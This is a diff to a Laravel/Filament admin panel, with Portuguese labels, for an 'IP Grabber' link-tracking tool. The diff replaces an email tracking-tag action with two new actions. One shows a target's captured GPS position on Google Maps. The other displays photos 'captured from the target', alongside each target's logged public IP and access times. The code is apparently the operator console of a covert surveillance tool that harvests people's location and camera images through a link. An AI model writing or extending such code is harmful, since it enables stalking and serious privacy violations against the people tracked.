@@ -5,13 +5,15 @@ namespace App\Filament\Resources\PixelTracks;
 use App\Filament\Resources\PixelTracks\Pages\ListProcessedIpGrabbers;
 use App\Filament\Resources\PixelTracks\Pages\ViewProcessedIpGrabber;
 use App\Models\IpGrabber;
+use App\Models\IpGrabberFoto;
 use Filament\Actions;
-use Filament\Notifications\Notification;
 use Filament\Resources\Resource;
 use Filament\Tables;
 use Filament\Tables\Table;
 use Illuminate\Database\Eloquent\Builder;
 use Illuminate\Database\Eloquent\Model;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\HtmlString;
 
 class ProcessedIpGrabbersResource extends Resource
 {
@@ -52,7 +54,11 @@ class ProcessedIpGrabbersResource extends Resource
 
     public static function getEloquentQuery(): Builder
     {
-        return parent::getEloquentQuery()->with('criador')->where('tracking_channel', 'link')->latest();
+        return parent::getEloquentQuery()
+            ->with('criador')
+            ->withCount('fotos')
+            ->where('tracking_channel', 'link')
+            ->latest();
     }
 
     public static function table(Table $table): Table
@@ -81,7 +87,8 @@ class ProcessedIpGrabbersResource extends Resource
                 Tables\Columns\TextColumn::make('status')
                     ->label('Status')
                     ->badge()
-                    ->state(fn (IpGrabber $record) => $record->clicked_at ? 'Capturado' : 'Aguardando'),
+                    ->state(fn (IpGrabber $record) => $record->clicked_at ? 'Capturado' : 'Aguardando')
+                    ->color(fn (IpGrabber $record) => $record->clicked_at ? 'success' : 'warning'),
                 Tables\Columns\TextColumn::make('total_acessos')->label('Acessos')->alignCenter()->sortable(),
                 Tables\Columns\TextColumn::make('clicked_at')->label('1º Acesso')->dateTime('d/m/Y H:i:s')->timezone('America/Sao_Paulo')->placeholder('—')->sortable(),
                 Tables\Columns\TextColumn::make('ip')->label('IP Público')->copyable()->searchable()->placeholder('—'),
@@ -90,18 +97,55 @@ class ProcessedIpGrabbersResource extends Resource
             ])
             ->recordActions([
                 Actions\ViewAction::make()->label('Histórico')->icon('heroicon-o-clock'),
-                Actions\Action::make('copiar_img_tag')
-                    ->label('Tag <img>')
-                    ->icon('heroicon-o-code-bracket')
-                    ->color('gray')
-                    ->action(function (IpGrabber $record): void {
-                        Notification::make()
-                            ->title('Tag HTML do link (e-mail)')
-                            ->body($record->emailTrackingTag())
-                            ->info()
-                            ->persistent()
-                            ->send();
-                    }),
+                Actions\Action::make('ver_mapa_gps')
+                    ->label('GPS')
+                    ->icon('heroicon-o-map-pin')
+                    ->color('info')
+                    ->visible(fn (IpGrabber $record) => $record->gps_latitude !== null)
+                    ->url(fn (IpGrabber $record) => "https://www.google.com/maps?q={$record->gps_latitude},{$record->gps_longitude}")
+                    ->openUrlInNewTab(),
+                Actions\Action::make('ver_foto')
+                    ->label('Foto')
+                    ->icon('heroicon-o-camera')
+                    ->color('success')
+                    ->visible(fn (IpGrabber $record) => ($record->fotos_count ?? 0) > 0)
+                    ->modalHeading('Foto capturada do alvo')
+                    ->modalContent(function (IpGrabber $record): HtmlString {
+                        $foto = $record->fotos()->first();
+
+                        if (! $foto) {
+                            return new HtmlString(
+                                '<div class="flex flex-col items-center gap-2 py-8 text-gray-400">'
+                                . '<p class="text-sm">Nenhuma foto capturada ainda.</p>'
+                                . '</div>'
+                            );
+                        }
+
+                        $url   = e(Storage::disk('public')->url($foto->path));
+                        $total = $record->fotos()->count();
+                        $info  = $foto->created_at
+                            ? $foto->created_at->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s')
+                            : '—';
+
+                        return new HtmlString(<<<HTML
+                            <div class="flex flex-col items-center gap-3 py-2">
+                                <img
+                                    src="{$url}"
+                                    alt="Foto capturada"
+                                    style="max-width:100%;max-height:65vh;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.18);"
+                                >
+                                <p class="text-xs text-gray-400">Capturada em {$info} &middot; {$total} foto(s) no total</p>
+                                <a
+                                    href="{$url}"
+                                    target="_blank"
+                                    rel="noopener"
+                                    class="text-xs text-primary-600 hover:underline"
+                                >Abrir em tamanho original ↗</a>
+                            </div>
+                        HTML);
+                    })
+                    ->modalSubmitAction(false)
+                    ->modalCancelActionLabel('Fechar'),
                 Actions\DeleteAction::make()->label('Excluir')->visible(fn (IpGrabber $record) => static::canDelete($record)),
             ])
             ->emptyStateHeading('Nenhum IP Grabber encontrado')
